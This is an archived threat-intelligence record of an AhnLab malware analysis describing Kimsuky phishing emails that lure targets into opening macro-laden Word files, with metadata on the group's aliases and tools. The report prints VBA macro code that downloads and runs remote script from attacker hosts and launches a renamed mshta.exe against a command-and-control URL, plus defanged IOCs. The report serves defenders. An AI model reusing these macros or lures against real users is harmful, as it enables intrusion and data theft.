{
    "id": "96bb0056-2f0d-421c-880e-15c92041002e",
    "created_at": "2023-01-12T15:08:15.38304Z",
    "updated_at": "2025-03-27T02:16:55.471531Z",
    "deleted_at": null,
    "sha1_hash": "48545b77d52b8dfd9257336c09c139d1c4e5dce9",
    "title": "2022-08-02 - Word File Provided as External Link When Replying to Attacker’s Email (Kimsuky)",
    "authors": "",
    "file_creation_date": "2022-08-18T03:52:00Z",
    "file_modification_date": "2022-08-18T03:52:00Z",
    "file_size": 2478972,
    "plain_text": "# Word File Provided as External Link When Replying to Attacker’s Email (Kimsuky)\n\n**asec.ahnlab.com/en/37396/**\n\nAugust 2, 2022\n\nThe ASEC analysis team has discovered the continuous distribution of malicious Word files\nwith North Korea-related materials. The types of discovered Word files included the one\ndiscussed in the “Overall Organizational Analysis Report of 2021 Kimsuky Attack Word\n**Files” (AhnLab TIP) and ‘Word Files Related to Diplomacy and National Defense Being**\n**Distributed‘. Also, there was also a type using mshta.**\n\nThe malicious Word files are distributed in various names as shown below.\n\nCV of Kim **(Korean American Organization of **,220711).doc\nYang**_** Foundation interim report(220716).doc\nConsultation Request.doc\n\n**Type 1**\n\nThe malicious Word file titled ‘Consultation Request.doc’ was most likely distributed through\nthe email shown below. The attacker impersonated a person from a Korean organization to\nsend an email requesting a consultation for a report.\n\n\n-----\n\nFirst attack email (without attachments)\nThe first attack email does not have any attachments. Only when a user responds favorably\nto the email does the attacker sends a reply with a URL for the user to download a malicious\nWord file.\n\n\n-----\n\nAttacker’s reply when a user declined the request (no URL included)\n\nSecond attack email sent when a user accepted the request (URL for downloading a Word\nfile included)\n\n\n-----\n\nClicking the link on the second email will display a webpage containing another malicious\nURL.\n\nWebpage prompting users to access another malicious URL\nClicking the download button will redirect the user to\nhxxps://accounts.serviceprotect[.]eu/signin/v2/identifier?hl=kr&passive=true&\n<omitted>rtnurl=aHR0cHM6Ly9kb2NzLmdv<omitted>. The URL cannot be currently\naccessed. Yet judging from the URL, it is likely that it collected login information of users and\ndownloaded a malicious Word file from the rtnurl parameter value.\n\nOpening the Word file will show an image asking users to enable macros by clicking the\nEnable Content button. If users comply, the file displays texts related to a consultation\nrequest, making it difficult to realize its malicious features.\n\n\n-----\n\nPrompting users to enable content\n\n\n-----\n\nPage displayed upon enabling content\nThe file contains a VBA macro that connects to a certain URL. Here are some parts of the\nmacro code below.\n```\nSub <strong>Reserve</strong>(pth)\n\n  Documents.Add\n\n  cnt = \"On Error Resume Next:Set mx = CreateObje\" &\n\"ct(\"\"Microsoft.XMLHTTP\"\"):mx.open \"\"GET\"\",\n\"\"hxxp://asssambly.mywebcommunity[.]org/file/upload/list.php?query=1\"\",\nFalse:mx.Send:Execute(mx.responseText)\"\n\nSub <strong>AutoOpen</strong>()\n\n  On Error Resume Next\n\n  pw = \"1qaz2wsx\"\n\n  Weed pw\n\n  obt = \"winmgmts:win32_process\"\n\nSet wm = <strong>GetObject</strong>(obt)\n\n    pth = <strong>Templates</strong>(1).Path & \"\\version.ini\"\n\n    cd = \"wscript.exe //e:vbscript //b\"\n\nwm.Create cd & pth\n\nEnd Sub\n\n```\n\n-----\n\nWhen the macro is run, it creates version.ini in the AppData\\Roaming\\Microsoft\\Templates\nfolder. It then runs the created ini file through wscript.exe.\n\nwscript.exe //e:vbscript //b %AppData%\\Microsoft\\Templates\\version.ini\n```\nOn Error Resume Next:Set mx = CreateObject(\"Microsoft.XMLHTTP\"):mx.open \"GET\",\n\"hxxp://asssambly.mywebcommunity[.]org/file/upload/list.php?query=1\",\nFalse:mx.Send:Execute(mx.responseText)\n\n```\nversion.ini\n\nAs the URL cannot be currently accessed, it is impossible to know what the macro does\nafter. It likely engaged in malicious behaviors such as leaking user PC information as\nmentioned in the previous post ‘Word Document Attack Targeting Companies\n**Specialized in Carbon Emissions‘.**\n\n**Type 2**\n\nType 2 is distributed with a file related to a specific webinar and accesses C2 through mshta.\nSimilar to Type 1, the Word file shows an image prompting users to enable macros. If users\ndo so, the file shows a following text related to the webinar with a topic of North Korea.\n\nPage displayed upon enabling content\nThe file also contains a VBA macro, which is shown below.\n\n\n-----\n\n```\nSub <strong>AutoOpen</strong>()\n\njsfds = \"cmd /c copy %windir%\\system32\\mshta.exe %tmp%\\gtfmon.exe\"\n\nShell jsfds, 0\n\njsfds = \"cmd /c timeout /t 7 >NUL && %tmp%\\gtfmon.exe\nhxxp://freunkown1.sportsontheweb[.]net/h.php\"\n\nShell jsfds, 0\n\nEnd Sub\n\n```\nWhen the macro is run, it copies mshta.exe in the TEMP folder as gtfmon.exe and attempts\nto access a certain URL using the cmd command.\n\ncmd /c timeout /t 7 >NUL && %tmp%\\gtfmon.exe\nhxxp://freunkown1.sportsontheweb[.]net/h.php\n\nAgain, the URL cannot be currently accessed and further behaviors cannot be confirmed.\nSimilar to Type 1, the macro likely performed malicious behaviors such as leaking user PC\ninformation.\n\nAs malicious Word files containing North Korea-related materials are continuously being\ndiscovered, users need to take caution. Since attackers are distributing malicious files by\nimpersonating normal users, one should check the email address of the sender and take\ncaution when opening attachments and clicking links.\n\n**[File Detection]**\n\nDownloader/DOC.Kimsuky\n\n**[IOC]**\n\n357ef37979b02b08120895ae5175eb0a (doc)\n\n7fe055d5aa72bd50470da61985e12a8a (doc)\n\nhxxp://asssambly.mywebcommunity[.]org/file/upload/list.php?query=1\n\nhxxp://freunkown1.sportsontheweb[.]net/h.php\n\n**Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to**\n**check related IOC and detailed analysis information.**\n\n[Categories:Malware Information](https://asec.ahnlab.com/en/category/malware-information/)\n\n[Tagged as:Kimsuky,](https://asec.ahnlab.com/en/tag/kimsuky-en/) [VBA Macro,](https://asec.ahnlab.com/tag/vba-macro/) [Word](https://asec.ahnlab.com/en/tag/word-en/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-02 - Word File Provided as External Link When Replying to Attacker’s Email (Kimsuky).pdf"
    ],
    "report_names": [
        "2022-08-02 - Word File Provided as External Link When Replying to Attacker’s Email (Kimsuky).pdf"
    ],
    "threat_actors": [
        {
            "id": "dc78f675-b309-431d-8160-b8dcff037d4f",
            "created_at": "2024-05-01T02:03:08.142224Z",
            "updated_at": "2025-03-27T02:05:17.417972Z",
            "deleted_at": null,
            "main_name": "NICKEL KIMBALL",
            "aliases": [
                "Black Banshee ",
                "Crooked Pisces ",
                "Emerald Sleet ",
                "Kimsuky ",
                "Opal Sleet ",
                "SharpTongue ",
                "TA427 ",
                "THALLIUM ",
                "Velvet Chollima ",
                "APT43 "
            ],
            "source_name": "Secureworks:NICKEL KIMBALL",
            "tools": [
                " KONNI",
                " KimJongRAT",
                " Kimsuky",
                "BabyShark"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "760f2827-1718-4eed-8234-4027c1346145",
            "created_at": "2023-01-06T13:46:38.670947Z",
            "updated_at": "2025-03-27T02:00:02.888195Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Thallium",
                "G0086",
                "APT43",
                "Springtail",
                "Sparkling Pisces",
                "Velvet Chollima",
                "Black Banshee",
                "Operation Stolen Pencil",
                "Emerald Sleet",
                "THALLIUM"
            ],
            "source_name": "MISPGALAXY:Kimsuky",
            "tools": [
                "RevClient",
                "xrat",
                "QUASARRAT",
                "RDP Wrapper",
                "TightVNC",
                "BabyShark"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "191d7f9a-8c3c-442a-9f13-debe259d4cc2",
            "created_at": "2022-10-25T15:50:23.280374Z",
            "updated_at": "2025-03-27T02:00:55.423485Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Kimsuky",
                "Black Banshee",
                "Velvet Chollima",
                "Emerald Sleet",
                "THALLIUM",
                "APT43",
                "TA427"
            ],
            "source_name": "MITRE:Kimsuky",
            "tools": [
                "schtasks",
                "Amadey",
                "Brave Prince",
                "CSPY Downloader",
                "gh0st RAT",
                "AppleSeed",
                "NOKKI",
                "QuasarRAT",
                "Gold Dragon",
                "PsExec",
                "KGH_SPY",
                "Mimikatz",
                "BabyShark"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "71a1e16c-3ba6-4193-be62-be53527817bc",
            "created_at": "2022-10-25T16:07:23.753455Z",
            "updated_at": "2025-03-27T02:02:09.963016Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "APT 43",
                "Black Banshee",
                "Emerald Sleet",
                "ITG16",
                "KTA082",
                "Kimsuky",
                "Larva-24005",
                "Operation Baby Coin",
                "Operation Covert Stalker",
                "Operation DEEP#DRIVE",
                "Operation DEEP#GOSU",
                "Operation Kabar Cobra",
                "Operation Mystery Baby",
                "Operation Red Salt",
                "Operation Smoke Screen",
                "Operation Stealth Power",
                "Operation Stolen Pencil",
                "SharpTongue",
                "Sparkling Pisces",
                "Springtail",
                "TA406",
                "TA427",
                "Thallium",
                "UAT-5394",
                "Velvet Chollima"
            ],
            "source_name": "ETDA:Kimsuky",
            "tools": [
                "AngryRebel",
                "AppleSeed",
                "BITTERSWEET",
                "BabyShark",
                "BoBoStealer",
                "CSPY Downloader",
                "Farfli",
                "FlowerPower",
                "Gh0st RAT",
                "Ghost RAT",
                "Gold Dragon",
                "GoldDragon",
                "GoldStamp",
                "JamBog",
                "KGH Spyware Suite",
                "KGH_SPY",
                "KPortScan",
                "KimJongRAT",
                "Kimsuky",
                "LATEOP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Lovexxx",
                "MailPassView",
                "Mechanical",
                "Mimikatz",
                "MoonPeak",
                "Moudour",
                "MyDogs",
                "Mydoor",
                "Network Password Recovery",
                "PCRat",
                "ProcDump",
                "PsExec",
                "ReconShark",
                "Remote Desktop PassView",
                "SHARPEXT",
                "SWEETDROP",
                "SmallTiger",
                "SniffPass",
                "TODDLERSHARK",
                "TRANSLATEXT",
                "Troll Stealer",
                "TrollAgent",
                "VENOMBITE",
                "WebBrowserPassView",
                "xRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536095,
    "ts_updated_at": 1743041815,
    "ts_creation_date": 1660794720,
    "ts_modification_date": 1660794720,
    "files": {
        "pdf": "https://archive.orkl.eu/48545b77d52b8dfd9257336c09c139d1c4e5dce9.pdf",
        "text": "https://archive.orkl.eu/48545b77d52b8dfd9257336c09c139d1c4e5dce9.txt",
        "img": "https://archive.orkl.eu/48545b77d52b8dfd9257336c09c139d1c4e5dce9.jpg"
    }
}